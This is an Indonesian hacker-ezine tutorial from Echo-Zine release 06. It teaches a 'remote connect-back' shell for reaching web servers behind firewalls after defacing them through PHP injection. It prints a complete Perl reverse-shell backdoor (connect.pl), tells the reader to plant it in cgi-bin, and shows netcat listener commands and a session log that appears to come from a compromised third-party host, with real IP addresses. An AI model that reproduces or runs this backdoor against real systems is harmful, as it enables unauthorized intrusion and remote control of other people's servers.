@@ -1,0 +1,121 @@
+	____________________   ___ ___ ________   
+	\_   _____/\_   ___ \ /   |   \\_____  \  
+	 |    __)_ /    \  \//    ~    \/   |   \ 
+	 |        \\     \___\    Y    /    |    \
+	/_______  / \______  /\___|_  /\_______  /
+	        \/         \/       \/         \/ 
+
+					    .OR.ID
+ECHO-ZINE RELEASE
+       06
+Author: the_day || the_day@echo.or.id 
+Online @ www.echo.or.id :: http://ezine.echo.or.id ::YM :the_day2000
+
+==Teknik Remote Connect-Back Shell==
+
+Hmm Sekarang aku buat artikelnya udah malem hari sabtu 6:11:04 23:45,setalah tadi chat sama mas K-159
+yang telah mengajarkan tentang Remote Backshell.Cerita dari Remote backshell waktu aku kesulitan untuk
+mengakses sebuah target yg ada di belakang firewall.Ketika aku kesulitan karena Bindtty tidak bisa di akses
+walaupun sudah keluar pid nya.Akhirnya mas K-159 memberitahu tantang teknik Remote BS ini.
+Lalu aku coba baca2 artikel di bosen.net .
+Ok sekarang kita langsung aja ke permasalahanya.Seperti biasa aku cari2 web yg bisa dideface dengan 
+menggunakan php injection.Artikel php injection akan dibahas selanjutnya sekarang aku akan coba dengan Remote BS.
+	Sekarang kita liat cara kerja dari semua backdoor telnet seperti bindtty :
+		- Membuka port xxxx dgn service telnet
+		- Tipe A<----B
+			artinya A sebagai target dan di pasang backdoor dan di A di buka port xxxx
+			Apabila A tidak di belakang firewall maka backdoor bindtty kita bisa diaccess.
+		contoh :
+		
+			[the_day@mysarah sploit]$ telnet 210.50.2.218 6655
+			Trying 210.50.2.218...
+			Connected to 210.50.2.218.
+			Escape character is '^]'.
+			passwd xxxxx
+			=- SecretColony Lab N Research Project Modified by K-159 -=
+			sh-2.05b$
+			sh-2.05b$
+		Diatas cara mengakses backdoor telnet menggunakan bindtty.
+	
+	Bagaimana dengan Teknik Remote Backshell
+		- Tipe A--->B
+			artinya target kita konekkan ke ip kita dan di ip kita dibuat listen pd port xxx
+		- Kita menjalankan sebuah program connect.pl di target script connect.pl
+		---------------------------------------------------------------------------------
+		#!/usr/bin/perl
+		# Remote Connect-Back Backdoor Shell v1.0.
+		# (c)AresU 2004
+		# 1ndonesia Security Team (1st)
+		# AresU[at]bosen.net
+		# Usage:
+		# 1) Listen port to received shell prompt using NetCat on your toolbox, for example: nc -l -p 9000
+		# 2) Remote Command Execution your BackDoor Shell, for example: perl connect.pl <iptoolbox> <ncportlisten>
+		# The supplied exploit code is not to be used for malicious purpose, but for educational purpose only. The Authors and 1ndonesian Security Team WILL NOT responsible for anything happened by the couse of using all information on these website.
+		use Socket;
+		$pamer="(c)AresU Connect-Back Backdoor Shell v1.0\n1ndonesia Security Team (1st)\n\n";
+		$cmd= "lpd";
+		$system= 'echo "`uname -a`";echo "`id`";/bin/sh';
+		$0=$cmd;
+		$target=$ARGV[0];
+		$port=$ARGV[1];
+		$iaddr=inet_aton($target) || die("Error: $!\n");
+		$paddr=sockaddr_in($port, $iaddr) || die("Error: $!\n");
+		$proto=getprotobyname('tcp');
+		cket(SOCKET, P_INET, SOCK_STREAM, $proto) || die("Error: $!\n");
+		nnect(SOCKET, $paddr) || die("Error: $!\n");
+		en(STDIN, ">&SOCKET");
+		en(STDOUT, ">&SOCKET");
+		en(STDERR, ">&SOCKET");
+		int STDOUT $pamer;
+		stem($system);
+		ose(STDIN);
+		ose(STDOUT);
+		ose(STDERR);
+		---------------------------------------------------------------------------------------------EOF
+		- Ingat kamu bisa kembangkan cara sendiri untuk menaruh file connect.pl di di folder cgi-bin
+		- Jangan lupa di chmod 755 connect.pl
+		- Cara menjalankannya pertama kita buka shell kita dan pakai nc untuk listen dan buka port
+		  Disini saya memakai shell lain yg menggunakan ip public.
+			[the_day@mysarah sploit]$ ssh  210.50.2.218 -l root -p 38
+			root@210.50.2.218's password:
+			Warning: Remote host denied X11 forwarding.
+			Last login: Wed Mar 10 16:10:21 2004 from 203-219-57-90-vic.tpgi.com.au
+			You have new mail.
+			[root@dellserver root]# nc -l -p 5000
+			sebelum ada koneksi
+		- Disini A mempunyai Ip :209.150.128.163
+			 B mempunyai Ip :210.50.2.218 dan listen di port 5000
+		- Jadi kita gunakan command menggunakan file connect.pl tadi menjadi
+			perl conect.pl 210.50.2.218 5000
+			Command exceeded maximum time of 10 second(s). 
+			Killed it!
+			
+		- Setelah terjadi hubungan A---->B[5000]
+			[root@dellserver root]# nc -l -p 5000
+			(c)AresU Connect-Back Backdoor Shell v1.0
+			1ndonesia Security Team (1st)
+			Linux griffin.host4u.net 2.2.26-rpd #5 SMP Wed Apr 28 17:36:44 CDT 2004 i686 unknown
+			uid=804(homeandbiz) gid=790(homeandbizgrp) groups=790(homeandbizgrp)
+			
+		- Yup kita sudah masuk melalui remote backshell,sekarang tinggal terserah kalian.
+            - http://www.homeandbiz.com/log.html 
+		
+	-----------------------------------------------------------------------
+	Wah udah ngantuk nech udah 12:06:04 00:54 ,udah satu hari .membuat artikel ini :D.
+	Saya mohon maaf kalau ada kekurangan dan sorry kalau ada yg ga ngerti bahasa the_day.maklum lah
+	udah ngantuk ZzzZZz
+	EOF
+	        			                                                           
+												  [the_day]
+   
+	REFERENSI
+		
+	http://bosen.net
+	http://aikmel.port5.com
+
+	*greetz to: 
+	[echostaff a.k.a y3dips, moby, comex ,z3r0byt3,K-159,c-a-s-e] && sarah[MY LOVELY], 
+	m_beben,yudhax,bithedz,Lieur-Euy
+	anak2 newbie_hacker,$the community,$peci@l temen2 seperjuangan 
+	kritik && saran kirimkan ke the_day[at]echo.or.id
+	And All #e-c-h-o & #aikmel Crew
